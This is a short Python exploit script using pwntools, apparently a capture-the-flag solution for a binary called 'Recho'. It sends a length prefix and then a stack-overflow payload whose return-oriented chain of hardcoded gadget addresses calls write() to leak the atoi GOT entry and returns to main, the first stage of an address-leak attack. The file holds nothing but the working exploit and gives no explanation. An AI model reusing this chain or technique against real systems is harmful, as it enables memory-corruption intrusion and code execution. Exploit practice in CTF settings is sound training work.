#!/usr/bin/python
from pwn import *

p = process('./Recho')

p.recvuntil('server!\n')
pop_rdi_ret = 0x00000000004008a3
pop_rsi_r15_ret = 0x00000000004008a1
pop_rdx_ret = 0x00000000004006fe
atoi_got = 0x601040
printf_plt = 0x4005E0
main = 0x0400791
write_plt = 0x4005D0

payload = 'a'*48 + p64(0) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(atoi_got) + p64(0) + p64(pop_rdx_ret) + p64(8) + p64(write_plt) + p64(main)
p.sendline(str(len(payload)).rjust(15, '0'))
p.sendline(payload)

p.interactive()
